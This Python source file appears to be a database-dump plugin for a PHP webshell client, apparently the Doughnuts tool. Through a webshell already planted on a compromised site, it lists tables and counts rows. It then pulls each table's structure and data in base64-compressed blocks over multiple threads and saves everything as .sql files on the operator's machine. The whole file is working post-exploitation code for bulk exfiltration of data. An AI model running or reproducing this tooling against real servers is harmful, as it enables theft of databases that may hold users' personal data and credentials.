from os import path, makedirs
from concurrent.futures import ThreadPoolExecutor, wait, as_completed, ALL_COMPLETED
from threading import Lock
from base64 import b64decode

from libs.config import alias, color, gget
from libs.myapp import send, get_db_connect_code, gzinflate
from libs.functions.webshell_plugins.db_mdump import *


PRINT_LOCK = Lock()
REQUEST_LOCK = Lock()


def get_table_name_php(database):
    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        return get_php_table_name(connect_type) % (
            get_db_connect_code(dbname=database))
    elif (connect_type == "mysqli"):
        return get_php_table_name(connect_type) % (
            get_db_connect_code(dbname=database))
    else:
        return ""


def get_table_row_number(database, table):
    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        php = get_php_table_row_number(connect_type) % (
            get_db_connect_code(dbname=database), table)
    elif (connect_type == "mysqli"):
        php = get_php_table_row_number(connect_type) % (
            get_db_connect_code(dbname=database), table)
    else:
        php = ""
    res = send(php)
    try:
        return int(res.r_text.strip())
    except ValueError:
        return -1


def get_table_construct(database, table, encoding):
    global REQUEST_LOCK

    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        php = get_php_table_construct(connect_type) % (
            get_db_connect_code(dbname=database), table)
    elif (connect_type == "mysqli"):
        php = get_php_table_construct(connect_type) % (
            get_db_connect_code(dbname=database), table)
    else:
        php = ""
    retry_time = 5
    text = None
    while retry_time and not text:
        with REQUEST_LOCK:
            res = send(php)
        try:
            text = gzinflate(b64decode(res.r_text.strip()))
        except Exception:
            text = None
        retry_time -= 1
    return text if text else ""


def get_data(index, database, table, encoding, offset, blocksize):
    global REQUEST_LOCK

    connect_type = gget("db_connect_type", "webshell")
    if (connect_type == "pdo"):
        php = get_php_data(connect_type) % (get_db_connect_code(
            dbname=database), table, offset, blocksize)
    elif (connect_type == "mysqli"):
        php = get_php_data(connect_type) % (get_db_connect_code(
            dbname=database), table, offset, blocksize)
    else:
        php = ""
    retry_time = 5
    text = None
    while retry_time and not text:
        with REQUEST_LOCK:
            res = send(php)
        try:
            text = gzinflate(b64decode(res.r_text.strip()))
        except Exception:
            text = None
        retry_time -= 1
    return index, text if text else ""


def thread_dump(database, table, encoding, download_path, blocksize, threads):
    global PRINT_LOCK
    table = table if table else "None"
    retry_time = 5
    row_number = -1
    while retry_time and row_number == -1:
        row_number = get_table_row_number(database, table)
        retry_time -= 1
        if (row_number != -1):
            with PRINT_LOCK:
                print(f"[Retry] fetch {database}.{table} [rows: {row_number}]")
    if (row_number == -1):
        with PRINT_LOCK:
            print(color.red(f"[Error] fetch {database}.{table}"))
        return
    file_name = f"{database}.{table}.sql"
    file_path = path.join(download_path, file_name).replace("\\", "/")
    with PRINT_LOCK:
        print(color.yellow(
            f"[Try] fetch {database}.{table} [rows: {row_number}]"))
    with open(file_path, "wb") as f, ThreadPoolExecutor(max_workers=threads) as tp:
        f.write(get_table_construct(database, table, encoding))
        f.flush()

        all_task = [tp.submit(get_data, i, database, table, encoding, offset, blocksize)
                    for i, offset in enumerate(range(0, row_number, blocksize))]
        results = {}
        # for i, offset in enumerate(range(0, row_number, blocksize)):
        #     index, result = get_data(
        #         i, database, table, encoding, offset, blocksize)
        #     results[index] = result

        for future in as_completed(all_task):
            index, result = future.result()
            if (result):
                results[index] = result

        for index in range(len(results) + 1):
            if results[index]:
                f.write(results[index])
                f.flush()

        with PRINT_LOCK:
            print(color.green(
                f"[Success] fetch {database}.{table} [rows: {row_number}]"))


@alias(True, _type="DATABASE", db="database", l="local_path",
       s="blocksize", ex="exclude", i="include", t="threads")
def run(database: str = "", local_path: str = "", encoding: str = "utf8",
        blocksize: int = 1000, exclude: str = "", include: str = "", threads: int = 5):
    """
    db_mdump

    Dump a database to a file by block compression and multi threads, Default file name is {database}.sql.
    You can use exclude options to exclude some tables.
    You can also use include options to dump only some tables.

    eg: db_mdump {database=current_database} {local_path=doughnuts/target/site.com/{database}.sql} {encoding="utf-8"} {blocksize=1000} {exclude="",eg="table1,table2"} {include="",eg="table1,table2"} {threads=5}
    """
    global PRINT_LOCK
    if (not gget("db_connected", "webshell")):
        print(color.red("Please run db_init command first"))
        return
    database = database if database else gget("db_dbname", "webshell")
    download_path = local_path or gget("webshell.download_path", "webshell")
    if not path.exists(download_path):
        makedirs(download_path)
    res = send(get_table_name_php(database))
    if (not res):
        return
    tables = res.r_text.strip()
    with PRINT_LOCK:
        print(color.yellow(f"\n[Try] Dump {database}\n"))
    with ThreadPoolExecutor(max_workers=threads) as tp:
        all_task = [tp.submit(thread_dump, database, table, encoding, download_path, blocksize, threads) for table in tables.split("\n") if table not in exclude.split(",")] if (
            not include) else [tp.submit(thread_dump, database, table, encoding, download_path, blocksize, threads) for table in tables.split("\n") if table in include.split(",")]
        wait(all_task, return_when=ALL_COMPLETED)
        with PRINT_LOCK:
            print(color.green(f"\n[Success] Dump {database}\n"))
